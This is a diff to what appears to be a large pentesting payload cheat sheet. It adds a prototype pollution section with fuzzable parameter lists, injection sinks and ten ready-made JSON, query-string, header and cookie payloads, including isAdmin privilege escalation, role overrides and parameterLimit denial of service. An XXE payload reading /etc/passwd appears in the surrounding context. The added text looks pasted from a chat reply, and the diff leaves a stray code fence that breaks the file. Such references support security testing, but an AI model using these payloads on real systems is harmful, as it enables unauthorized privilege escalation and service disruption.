@@ -5236,12 +5236,57 @@ Classic XXE - etc passwd
 ]>
 <data>&file;</data>
 ```
-
+```
 
 # Prototype Pollution
 
 > Prototype pollution is a type of vulnerability that occurs in JavaScript when properties of Object.prototype are modified. This is particularly risky because JavaScript objects are dynamic and we can add properties to them at any time. Also, almost all objects in JavaScript inherit from Object.prototype, making it a potential attack vector.
 
+Here’s a curated list of **fuzzable parameters** and input sinks commonly involved in **Prototype Pollution**, tailored for pentesting workflows like yours:
+
+---
+
+## 🧪 Common Parameters to Fuzz for Prototype Pollution
+
+```text
+__proto__, constructor, prototype, __defineGetter__, __defineSetter__, toString, valueOf, hasOwnProperty, isAdmin, debug, config, settings, options, metadata, user, role, privileges, access, allowDots, json spaces
+```
+---
+## 🔎 Where to Check Them
+
+### 💻 Client-Side JS Sinks
+- JSON config mergers like `$.extend()`, `Object.assign()`, lodash’s `_.merge`
+- Parsing logic in React/Vue/Angular props or initializers
+- Inputs from URL parameters, localStorage, postMessage, or cookies
+
+### 🌐 Server-Side Vectors
+- REST API endpoints that accept JSON body (especially config/user-related)
+- Query strings (`?__proto__[key]=value`)
+- Headers (`X-JSON: {"__proto__":{...}}`)
+- Cookies (encoded JSON payloads)
+- Third-party libraries that merge objects (Express, Hapi, Fastify)
+
+---
+
+## 🔁 How to Inject
+
+Use each parameter in combinations like:
+
+```json
+{
+  "__proto__": { "polluted": "true" }
+}
+```
+
+or
+
+```http
+POST /api/vuln
+Content-Type: application/json
+
+{"constructor": {"newKey": "test"}}
+```
+---
 ## Summary
 
 * [Tools](#tools)
@@ -5401,6 +5446,115 @@ __proto__.baaebfc = baaebfc
 ?__proto__[test]=test
 ```
 
+**1. Basic Prototype Injection**  
+Pollute `Object.prototype` with arbitrary keys.
+
+```json
+{"__proto__": {"polluted": "true"}}
+```
+
+**Expected Behavior:** All objects inherit `polluted: true` property.
+
+---
+
+**2. Bypass Access Control via `isAdmin` Injection**  
+Override privilege checks globally.
+
+```json
+{"__proto__": {"isAdmin": true}}
+```
+
+**Expected Behavior:** Application treats all users as admin.
+
+---
+
+**3. Modify CORS Headers**  
+Inject into prototype to alter response headers.
+
+```json
+{"__proto__": {"exposedHeaders": ["X-Pwned"]}}
+```
+
+**Expected Behavior:** `Access-Control-Expose-Headers: X-Pwned` appears in response.
+
+---
+
+**4. Change Response Formatting**  
+Alter JSON spacing or padding.
+
+```json
+{"__proto__": {"json spaces": 10}}
+```
+
+**Expected Behavior:** JSON response is padded with extra spaces.
+
+---
+
+**5. ExpressJS Parameter Limit Abuse**  
+Trigger DoS or logic bypass.
+
+```json
+{"__proto__": {"parameterLimit": 1}}
+```
+
+**Expected Behavior:** Server restricts parameters, affecting routing or logic.
+
+---
+
+**6. Enable Dot Notation Parsing**  
+Force parsing of nested keys.
+
+```json
+{"__proto__": {"allowDots": true}}
+```
+
+**Expected Behavior:** `foo.bar=baz` parsed as nested object.
+
+---
+
+**7. Status Code Manipulation**  
+Override HTTP response status.
+
+```json
+{"__proto__": {"status": 510}}
+```
+
+**Expected Behavior:** Server responds with status code 510.
+
+---
+
+**8. Pollute via URL Parameters**  
+Inject prototype keys via query string.
+
+```
+?__proto__[isAdmin]=true
+```
+
+**Expected Behavior:** Server-side object inherits `isAdmin: true`.
+
+---
+
+**9. Pollute via Headers**  
+Inject prototype keys using custom headers.
+
+```
+X-JSON: {"__proto__": {"debug": true}}
+```
+
+**Expected Behavior:** Debug mode enabled globally.
+
+---
+
+**10. Pollute via Cookie**  
+Inject prototype keys through session cookie.
+
+```
+Cookie: session={"__proto__": {"role": "admin"}}
+```
+**Expected Behavior:** All sessions treated as admin.
+---
+
+
 ### Prototype Pollution Gadgets
 
 A "gadget" in the context of vulnerabilities typically refers to a piece of code or functionality that can be exploited or leveraged during an attack. When we talk about a "prototype pollution gadget," we're referring to a specific code path, function, or feature of an application that is susceptible to or can be exploited through a prototype pollution attack.
@@ -5421,7 +5575,6 @@ Either create your own gadget using part of the source with [yeswehack/pp-finder
     * [Filter Bypass](#filter-bypass)
 * [Labs](#labs)
 * [References](#references)
-
 
 ## Methodology
 
